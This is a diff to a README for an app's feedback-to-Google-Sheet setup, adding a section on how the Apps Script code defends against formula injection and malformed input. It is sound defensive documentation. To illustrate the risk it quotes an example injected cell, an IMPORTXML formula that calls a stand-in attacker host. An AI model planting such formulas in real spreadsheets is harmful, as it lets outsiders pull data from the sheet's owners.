@@ -20,5 +20,21 @@ Do this signed in as **eatoutbetter@gmail.com**, which owns the sheet.
 5. Send feedback from the app (both the ★ prompt after a scan and the Feedback link). Each should add one row
    with all eleven columns filled where relevant.
 
+## Security (2026-10-04)
+
+The web-app URL is public and unauthenticated, so `Code.gs` treats every value as hostile:
+
+- **Formula injection is blocked.** Any text starting with `=`, `+`, `-`, `@`, a tab or a carriage return gets a
+  leading `'`, so the sheet stores it as plain text instead of running it. (The `'` doesn't show in the cell.)
+  Without this, a cell like `=IMPORTXML("https://attacker…", …)` would run when someone opens the sheet.
+- **Every cell is capped at 2,000 characters.**
+- **`feedback_type`, `Screen` and `environment` are allowlisted** (see the lists at the top of `Code.gs`).
+  Anything else is written as `other`. **If the app adds a new screen or feedback type, add it to the list** or
+  it will show up as `other`. `Rating` must be a whole number 1–5 and `dish_count` a whole number, else blank.
+- **Errors are no longer sent back to the caller.** They're in **Apps Script → Executions**.
+
+After pasting a new version, also do this once: in the sheet, **Edit → Find and replace**, search `=` with
+**Also search within formulas** ticked, and delete any row you didn't write.
+
 Columns are matched by header name, so reordering the sheet is safe. To capture a new field later, add one line
 to `COLUMNS` and repeat steps 2 and 4.
